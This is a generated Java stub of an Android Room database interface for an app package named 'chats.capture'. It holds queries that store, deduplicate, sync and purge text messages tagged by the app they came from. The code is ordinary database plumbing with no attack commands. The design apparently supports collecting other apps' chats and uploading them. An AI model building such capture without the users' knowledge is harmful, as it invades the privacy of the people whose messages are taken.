package com.chats.capture.database;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000<\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\t\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\u0010 \n\u0002\b\u0006\n\u0002\u0010\b\n\u0002\b\u000f\bg\u0018\u00002\u00020\u0001J\u0016\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H\u00a7@\u00a2\u0006\u0002\u0010\u0006J\u0016\u0010\u0007\u001a\u00020\u00032\u0006\u0010\b\u001a\u00020\tH\u00a7@\u00a2\u0006\u0002\u0010\nJ(\u0010\u000b\u001a\u0004\u0018\u00010\f2\u0006\u0010\r\u001a\u00020\u00052\u0006\u0010\u000e\u001a\u00020\u00052\u0006\u0010\u000f\u001a\u00020\tH\u00a7@\u00a2\u0006\u0002\u0010\u0010J\u0014\u0010\u0011\u001a\u000e\u0012\n\u0012\b\u0012\u0004\u0012\u00020\f0\u00130\u0012H\'J\u0018\u0010\u0014\u001a\u0004\u0018\u00010\f2\u0006\u0010\u0004\u001a\u00020\u0005H\u00a7@\u00a2\u0006\u0002\u0010\u0006J\u001c\u0010\u0015\u001a\u000e\u0012\n\u0012\b\u0012\u0004\u0012\u00020\f0\u00130\u00122\u0006\u0010\r\u001a\u00020\u0005H\'J\u001c\u0010\u0016\u001a\u000e\u0012\n\u0012\b\u0012\u0004\u0012\u00020\f0\u00130\u00122\u0006\u0010\u0017\u001a\u00020\u0005H\'J\u001e\u0010\u0018\u001a\b\u0012\u0004\u0012\u00020\f0\u00132\b\b\u0002\u0010\u0019\u001a\u00020\u001aH\u00a7@\u00a2\u0006\u0002\u0010\u001bJ\u000e\u0010\u001c\u001a\u00020\u001aH\u00a7@\u00a2\u0006\u0002\u0010\u001dJ\u0016\u0010\u001e\u001a\u00020\u00032\u0006\u0010\u001f\u001a\u00020\fH\u00a7@\u00a2\u0006\u0002\u0010 J\u001c\u0010!\u001a\u00020\u00032\f\u0010\"\u001a\b\u0012\u0004\u0012\u00020\f0\u0013H\u00a7@\u00a2\u0006\u0002\u0010#J\u0016\u0010$\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H\u00a7@\u00a2\u0006\u0002\u0010\u0006J(\u0010%\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u00052\u0006\u0010\u000f\u001a\u00020\t2\b\u0010&\u001a\u0004\u0018\u00010\u0005H\u00a7@\u00a2\u0006\u0002\u0010\'J\u0016\u0010(\u001a\u00020\u00032\u0006\u0010\u001f\u001a\u00020\fH\u00a7@\u00a2\u0006\u0002\u0010 \u00a8\u0006)"}, d2 = {"Lcom/chats/capture/database/ChatDao;", "", "deleteChat", "", "id", "", "(Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "deleteOldSyncedChats", "beforeTimestamp", "", "(JLkotlin/coroutines/Continuation;)Ljava/lang/Object;", "findDuplicateChat", "Lcom/chats/capture/models/ChatData;", "appPackage", "text", "timestamp", "(Ljava/lang/String;Ljava/lang/String;JLkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getAllChats", "Lkotlinx/coroutines/flow/Flow;", "", "getChatById", "getChatsByApp", "getChatsByIdentifier", "chatIdentifier", "getUnsyncedChats", "limit", "", "(ILkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getUnsyncedCount", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "insertChat", "chat", "(Lcom/chats/capture/models/ChatData;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "insertChats", "chats", "(Ljava/util/List;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "markAsSynced", "markSyncAttempt", "error", "(Ljava/lang/String;JLjava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "updateChat", "app_debug"})
@androidx.room.Dao()
public abstract interface ChatDao {
    
    @androidx.room.Query(value = "SELECT * FROM chats ORDER BY timestamp DESC")
    @org.jetbrains.annotations.NotNull()
    public abstract kotlinx.coroutines.flow.Flow<java.util.List<com.chats.capture.models.ChatData>> getAllChats();
    
    @androidx.room.Query(value = "SELECT * FROM chats WHERE synced = 0 ORDER BY timestamp ASC LIMIT :limit")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getUnsyncedChats(int limit, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.util.List<com.chats.capture.models.ChatData>> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM chats WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getChatById(@org.jetbrains.annotations.NotNull()
    java.lang.String id, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super com.chats.capture.models.ChatData> $completion);
    
    @androidx.room.Query(value = "SELECT * FROM chats WHERE appPackage = :appPackage ORDER BY timestamp DESC")
    @org.jetbrains.annotations.NotNull()
    public abstract kotlinx.coroutines.flow.Flow<java.util.List<com.chats.capture.models.ChatData>> getChatsByApp(@org.jetbrains.annotations.NotNull()
    java.lang.String appPackage);
    
    @androidx.room.Query(value = "SELECT * FROM chats WHERE chatIdentifier = :chatIdentifier ORDER BY timestamp ASC")
    @org.jetbrains.annotations.NotNull()
    public abstract kotlinx.coroutines.flow.Flow<java.util.List<com.chats.capture.models.ChatData>> getChatsByIdentifier(@org.jetbrains.annotations.NotNull()
    java.lang.String chatIdentifier);
    
    @androidx.room.Query(value = "SELECT * FROM chats WHERE appPackage = :appPackage AND text = :text AND ABS(timestamp - :timestamp) < 5000")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object findDuplicateChat(@org.jetbrains.annotations.NotNull()
    java.lang.String appPackage, @org.jetbrains.annotations.NotNull()
    java.lang.String text, long timestamp, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super com.chats.capture.models.ChatData> $completion);
    
    @androidx.room.Query(value = "SELECT COUNT(*) FROM chats WHERE synced = 0")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getUnsyncedCount(@org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.lang.Integer> $completion);
    
    @androidx.room.Insert(onConflict = 1)
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object insertChat(@org.jetbrains.annotations.NotNull()
    com.chats.capture.models.ChatData chat, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Insert(onConflict = 1)
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object insertChats(@org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.ChatData> chats, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Update()
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object updateChat(@org.jetbrains.annotations.NotNull()
    com.chats.capture.models.ChatData chat, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "UPDATE chats SET synced = 1, syncAttempts = 0, errorMessage = NULL WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object markAsSynced(@org.jetbrains.annotations.NotNull()
    java.lang.String id, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "UPDATE chats SET syncAttempts = syncAttempts + 1, lastSyncAttempt = :timestamp, errorMessage = :error WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object markSyncAttempt(@org.jetbrains.annotations.NotNull()
    java.lang.String id, long timestamp, @org.jetbrains.annotations.Nullable()
    java.lang.String error, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "DELETE FROM chats WHERE synced = 1 AND timestamp < :beforeTimestamp")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object deleteOldSyncedChats(long beforeTimestamp, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @androidx.room.Query(value = "DELETE FROM chats WHERE id = :id")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object deleteChat(@org.jetbrains.annotations.NotNull()
    java.lang.String id, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super kotlin.Unit> $completion);
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 3, xi = 48)
    public static final class DefaultImpls {
    }
}